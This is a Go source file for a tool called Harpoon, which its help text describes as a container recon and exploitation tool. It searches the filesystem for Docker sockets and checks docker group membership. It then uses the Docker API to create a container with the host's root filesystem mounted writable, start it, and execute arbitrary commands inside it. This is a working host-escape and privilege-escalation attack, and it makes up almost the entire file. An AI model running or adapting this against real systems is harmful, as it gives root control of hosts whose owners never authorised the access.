package main

import (
  "bytes"
  "context"
  "encoding/json"
  "flag"
  "fmt"
  "io/ioutil"
  "net"
  "net/http"
  "os"
  "os/exec"
  "strings"
)

type dockerInfo struct {
  hasDocker       bool
  dockerSockPath  []string
  dockerApiVer    string
  dockerVer       string
  dockerUserGroup bool
}

func querySocket(socketPath string, method string, path string, payload string) string {
  //var message string = method + " " + path + " HTTP/1.1\n\r" + "Host:\n\r" + "\n\r"
  httpc := http.Client{
    Transport: &http.Transport{
      DialContext: func(_ context.Context, _, _ string) (net.Conn, error) {
        return net.Dial("unix", socketPath)
      },
    },
  }

  var response *http.Response
  var err error
  switch method {
  case "GET":
    response, err = httpc.Get("http://unix" + path)
    if err != nil {
      panic(err)
    }
  case "POST":
    response, err = httpc.Post("http://unix"+path, "application/json", strings.NewReader(payload))
    if err != nil {
      panic(err)
    }
  }

  defer response.Body.Close()
  body, err := ioutil.ReadAll(response.Body)
  if err != nil {
    panic(err)
  }
  //response, err = httpc.Post("http://unix"+flag.Args()[1], "application/octet-stream", strings.NewReader(*post))
  return string(body)
}

func (di dockerInfo) toString() string {
  var sb strings.Builder
  //sb.WriteString(fmt.Sprintf("\thas_docker: %v\n", di.hasDocker))
  sb.WriteString(fmt.Sprintf("\tsocket_paths: %v\n", di.dockerSockPath))
  sb.WriteString(fmt.Sprintf("\tdocker_ver_info: %v\n", di.dockerApiVer))
  sb.WriteString(fmt.Sprintf("\tin_docker_group: %v\n", di.dockerUserGroup))
  return sb.String()
}

func (di dockerInfo) findDockerSocket() []string {
  stdout, _ := execCmd("find / -name docker.sock")
  socks := make([]string, 1)
  for _, e := range strings.Split(stdout.String(), "\n") {
    if e != "" {
      socks = append(socks, e)
    }
  }
  return socks
}

func (di dockerInfo) isDockerUser() bool {
  stdout, _ := execCmd("groups")
  return strings.Contains(stdout.String(), "docker")
}

func (di dockerInfo) findDockerApiVer() string {
  // curl -s -XGET --unix-socket /run/docker.sock http://localhost/version 2>&1
  var verInfo bytes.Buffer
  hasDocker, _ := execCmd("which docker")
  //fmt.Println(hasDocker.String())
  if hasDocker.String() != "" {
    fmt.Print("[+] Found docker bin: " + hasDocker.String())
    di.hasDocker = true
    verInfo, _ = execCmd("docker version")
  } else if di.dockerSockPath != nil {
    if len(di.dockerSockPath) >= 1 {
      // just take the first value
      fmt.Println("[+] Docker socket: " + di.dockerSockPath[1])
      var dockerSocket string = di.dockerSockPath[1]
      verInfoStr := querySocket(dockerSocket, "GET", "/version", "")
      return verInfoStr
    }
  }
  return verInfo.String()
}

type kubernetesInfo struct {
}

func execCmd(cmdStr string) (bytes.Buffer, bytes.Buffer) {
  cmdArr := strings.Split(cmdStr, " ")
  var stdout, stderr bytes.Buffer
  cmd := exec.Command(cmdArr[0], cmdArr[1:]...)
  cmd.Stdout = &stdout
  cmd.Stderr = &stderr
  cmd.Run()
  return stdout, stderr
}

func createContainer(socketPath string, mount string) string {
  var payload string = `{"Image":"ubuntu","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","ReadOnly":false,"Source":"/","Target":"/mnt"}]}`
  res := querySocket(socketPath, "POST", "/containers/create", payload)
  return res
}

func startContainer(socketPath string, containerId string) string {
  var path string = "/containers/" + containerId + "/start"
  res := querySocket(socketPath, "POST", path, "")
  return res
}

func main() {
  var help string = `Harpoon

                          ,   ,
    ~~~~~~~~~~~~~~~~~~~~~~~"o"~~~~
            ____________     o
         _--            --_ o
        /       ___      __\ o
       / _         _\    \__o 
      / / |              X  |
     / /   \               /
    / _ \   \             /
    \/ \/    -.____ ____.-

Containerization recon and exploitation tool.
Usage: harpoon [options]

Options:
  Todo: write this help...
`

  // set up command line opts
  findCommand := flag.NewFlagSet("fingerprint", flag.ExitOnError)
  createCommand := flag.NewFlagSet("create", flag.ExitOnError)
  socketFlag := createCommand.String("sock", "/run/docker.sock", "The path to the docker socket.")
  mountFlag := createCommand.String("mount", "/:/mnt", "What file to from the host to mount and where to mount it.")
  startCommand := flag.NewFlagSet("start", flag.ExitOnError)
  containerIdStartFlag := startCommand.String("container_id", "", "The id of the container to try and execute commands in.")
  execCommand := flag.NewFlagSet("exec", flag.ExitOnError)
  containerIdFlag := execCommand.String("container_id", "", "The id of the container to try and execute commands in.")
  commandFlag := execCommand.String("cmd", "", "The command to execute inside of the container.")

  dockerInfo := dockerInfo{}
  //kubernetesInfo := kubernetesInfo{}

  if len(os.Args) == 1 {
    fmt.Println(help)
    os.Exit(1)
  }

  switch os.Args[1] {
  case "fingerprint":
    findCommand.Parse(os.Args[2:])
    socks := dockerInfo.findDockerSocket()
    if socks != nil {
      dockerInfo.dockerSockPath = socks
    }
    dockerInfo.dockerUserGroup = dockerInfo.isDockerUser()
    r := strings.NewReplacer("\n", "\n\t\t")
    dockerApiInfo := dockerInfo.findDockerApiVer()
    dockerInfo.dockerApiVer = fmt.Sprintf("\n\t\t%s\n", r.Replace(dockerApiInfo))
    // display found info
    fmt.Printf("[+] Docker info found:\n")
    fmt.Println(dockerInfo.toString())
  case "create":
    createCommand.Parse(os.Args[2:])
    if createCommand.Parsed() {
      if *mountFlag == "" {
        fmt.Println(help)
        return
      }
      if *socketFlag == "" {
        fmt.Println(help)
        return
      }
      res := createContainer(*socketFlag, *mountFlag)
      fmt.Println(res)
    }
  case "start":
    startCommand.Parse(os.Args[2:])
    if startCommand.Parsed() {
      if *socketFlag == "" {
        fmt.Println(help)
        return
      }
      if *containerIdStartFlag == "" {
        fmt.Println(help)
      }
      res := startContainer(*socketFlag, *containerIdStartFlag)
      fmt.Println(res)
    }
  case "exec":
    execCommand.Parse(os.Args[2:])
    if execCommand.Parsed() {
      if *socketFlag == "" {
        fmt.Println(help)
        return
      }
      if *containerIdFlag == "" {
        fmt.Println(help)
        return
      }
      if *commandFlag == "" {
        fmt.Println(help)
        return
      }
      // set up an exec
      cmdStr := strings.Trim(strings.Join(strings.Fields(fmt.Sprintf(*commandFlag)), "\",\""), "[]")
      payload := `{"AttachStdin": false,"AttachStdout": true,"AttachStderr": true,"DetachKeys": "ctrl-p,ctrl-q","Tty": false,"Cmd":["` + cmdStr + `"]}`
      res := querySocket(*socketFlag, "POST", "/containers/"+*containerIdFlag+"/exec", payload)
      fmt.Println(res)
      byt := []byte(res)
      var dat map[string]interface{}
      if err := json.Unmarshal(byt, &dat); err != nil {
        panic(err)
      }
      fmt.Println(dat["Id"])
      payload = `{"Detach": false, "Tty": false}`
      res = querySocket(*socketFlag, "POST", "/exec/"+dat["Id"].(string)+"/start", payload)
      fmt.Println(res)
    }
  }
}
